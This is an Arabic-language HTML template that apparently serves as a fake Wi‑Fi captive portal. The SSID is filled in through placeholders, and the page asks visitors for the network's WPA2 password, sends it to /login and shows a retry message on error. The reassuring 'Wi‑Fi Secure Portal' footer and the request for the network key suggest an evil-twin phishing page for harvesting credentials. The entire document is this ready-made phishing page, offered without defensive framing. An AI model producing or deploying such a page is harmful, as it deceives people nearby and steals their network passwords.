<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>WiFi Login - {{SSID}}</title>
  <style>{{CSS}}</style>
</head>
<body>
  <div class="bg"></div>
  <div class="card">
    <div class="logo">
      <svg viewBox="0 0 24 24" width="64" height="64" fill="none">
        <path d="M12 18.5a1.5 1.5 0 100 3 1.5 1.5 0 000-3z" fill="currentColor"/>
        <path d="M8.5 15.5a6 6 0 017 0" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
        <path d="M5.5 12.2a10 10 0 0113 0" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
        <path d="M2.8 8.8a14 14 0 0118.4 0" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
      </svg>
    </div>
    <h1>تسجيل الدخول</h1>
    <p class="sub">اتصل بشبكة <strong>{{SSID}}</strong></p>
    <p class="hint">أدخل كلمة مرور الشبكة للمتابعة إلى الإنترنت</p>

    <form method="POST" action="/login" id="f">
      <label for="password">كلمة مرور Wi‑Fi</label>
      <input
        id="password"
        name="password"
        type="password"
        placeholder="أدخل كلمة المرور"
        autocomplete="current-password"
        required
        minlength="8"
      />
      <button type="submit" id="btn">اتصال</button>
    </form>

    <div id="msg" class="msg hidden"></div>
    <p class="foot">Wi‑Fi Secure Portal · Encryption WPA2</p>
  </div>

  <script>
    const params = new URLSearchParams(location.search);
    const msg = document.getElementById('msg');
    if (params.get('error')) {
      msg.textContent = 'كلمة المرور غير صحيحة. حاول مرة أخرى.';
      msg.classList.remove('hidden');
      msg.classList.add('err');
    }
    document.getElementById('f').addEventListener('submit', function () {
      const btn = document.getElementById('btn');
      btn.disabled = true;
      btn.textContent = 'جاري التحقق...';
    });
  </script>
</body>
</html>
